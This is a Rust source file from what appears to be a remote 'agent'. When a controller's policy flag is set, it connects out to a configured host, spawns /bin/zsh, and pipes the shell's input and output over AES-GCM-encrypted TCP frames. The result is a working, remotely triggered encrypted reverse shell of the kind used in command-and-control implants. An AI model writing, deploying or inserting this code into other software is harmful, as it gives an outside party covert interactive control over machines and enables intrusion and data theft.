use crate::config::AgentConfig;
use crate::crypto::SessionCrypto;
use crate::policy::PolicyState;
use anyhow::{anyhow, Context, Result};
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use base64::Engine;
use rand::RngCore;
use serde_json;
use std::process::Stdio;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::process::Command;

pub async fn ensure_shell(config: &AgentConfig, state: &tokio::sync::Mutex<PolicyState>) -> Result<()> {
    let policy = state.lock().await.last_policy.clone();
    if policy.is_none() {
        return Ok(());
    }
    let policy = policy.unwrap();
    if !policy.start_shell {
        return Ok(());
    }
    let session_key = policy.session_key_b64.ok_or_else(|| anyhow!("missing shell session key"))?;
    start_shell_session(config, &session_key).await?;
    Ok(())
}

async fn start_shell_session(config: &AgentConfig, session_key_b64: &str) -> Result<()> {
    let key_bytes = base64::engine::general_purpose::STANDARD.decode(session_key_b64).context("decode session")?;
    if key_bytes.len() != 32 {
        return Err(anyhow!("invalid session key"));
    }
    let cipher = Aes256Gcm::new_from_slice(&key_bytes).context("cipher")?;
    let addr = format!("{}:{}", config.shell_host, config.shell_port);
    let mut stream = TcpStream::connect(addr).await.context("connect shell")?;
    let handshake = serde_json::json!({ "agent_id": config.agent_id, "session_key_b64": session_key_b64 });
    let handshake_bytes = serde_json::to_vec(&handshake).context("handshake json")?;
    let shared = SessionCrypto::new(&config.shared_key_b64)?;
    let encrypted_handshake = shared.encrypt(&handshake_bytes)?;
    let mut frame = Vec::with_capacity(4 + encrypted_handshake.len());
    frame.extend_from_slice(&(encrypted_handshake.len() as u32).to_be_bytes());
    frame.extend_from_slice(&encrypted_handshake);
    stream.write_all(&frame).await.context("send handshake")?;
    let mut child = Command::new("/bin/zsh")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .context("spawn shell")?;
    let mut stdin = child.stdin.take().ok_or_else(|| anyhow!("no stdin"))?;
    let mut stdout = child.stdout.take().ok_or_else(|| anyhow!("no stdout"))?;
    let mut stderr = child.stderr.take().ok_or_else(|| anyhow!("no stderr"))?;
    let (mut stream_read, mut stream_write) = stream.into_split();
    let mut out_buf = vec![0u8; 4096];
    let mut err_buf = vec![0u8; 4096];
    let mut in_buf = vec![0u8; 4096];
    loop {
        tokio::select! {
            read = stream_read.read(&mut in_buf) => {
                let n = read?;
                if n == 0 { break; }
                let decrypted = decrypt_frame(&cipher, &in_buf[..n])?;
                stdin.write_all(&decrypted).await?;
            }
            read = stdout.read(&mut out_buf) => {
                let n = read?;
                if n > 0 {
                    let encrypted = encrypt_frame(&cipher, &out_buf[..n])?;
                    stream_write.write_all(&encrypted).await?;
                }
            }
            read = stderr.read(&mut err_buf) => {
                let n = read?;
                if n > 0 {
                    let encrypted = encrypt_frame(&cipher, &err_buf[..n])?;
                    stream_write.write_all(&encrypted).await?;
                }
            }
        }
    }
    Ok(())
}

fn encrypt_frame(cipher: &Aes256Gcm, data: &[u8]) -> Result<Vec<u8>> {
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ciphertext = cipher.encrypt(nonce, data).map_err(|_| anyhow!("encrypt"))?;
    let mut out = Vec::with_capacity(4 + 12 + ciphertext.len());
    let len = (12 + ciphertext.len()) as u32;
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(&nonce_bytes);
    out.extend_from_slice(&ciphertext);
    Ok(out)
}

fn decrypt_frame(cipher: &Aes256Gcm, data: &[u8]) -> Result<Vec<u8>> {
    if data.len() < 4 + 12 {
        return Err(anyhow!("frame too small"));
    }
    let len = u32::from_be_bytes([data[0], data[1], data[2], data[3]]) as usize;
    if data.len() < 4 + len {
        return Err(anyhow!("frame length mismatch"));
    }
    let payload = &data[4..4 + len];
    let (nonce_bytes, ciphertext) = payload.split_at(12);
    let nonce = Nonce::from_slice(nonce_bytes);
    let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|_| anyhow!("decrypt"))?;
    Ok(plaintext)
}
